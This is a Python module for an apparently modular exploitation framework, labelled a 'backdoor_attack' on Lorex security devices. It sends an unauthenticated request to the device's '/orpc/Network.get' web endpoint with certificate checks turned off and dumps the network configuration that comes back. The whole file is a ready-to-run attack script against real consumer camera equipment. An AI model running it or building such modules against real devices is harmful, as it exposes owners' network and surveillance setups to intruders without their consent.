import httpx
from core.base import BaseModule

class Module(BaseModule):
    def __init__(self):
        super().__init__()
        self.name = "lorex/backdoor_attack"
        self.description = "Exploit module to extract operational variables data from unprotected Lorex web frameworks."
        self.type = "attack"
        self.options = {
            "TARGET": {"required": True, "value": ""},
            "PORT": {"required": False, "value": "80"}
        }

    async def run(self):
        target = self.options["TARGET"]["value"]
        port = self.options["PORT"]["value"]
        
        if not target.startswith(("http://", "https://")):
            url = f"http://{target}:{port}/orpc/Network.get"
        else:
            url = f"{target.rstrip('/')}/orpc/Network.get"
            
        try:
            async with httpx.AsyncClient(timeout=8.0, verify=False) as client:
                print("\033[1;33m[*] Requesting operational network matrix parameters from Lorex interface...\033[0m")
                response = await client.get(url)
                
                if response.status_code == 200 and ("result" in response.text or "params" in response.text):
                    return {
                        "success": True,
                        "details": f"Lorex device system environment parameters dumped successfully:\n{response.text.strip()}"
                    }
        except Exception as e:
            return {"success": False, "error": str(e)}
        return {"success": False, "details": "Exploit delivery completed but the targeted subsystem refused payload extraction."}
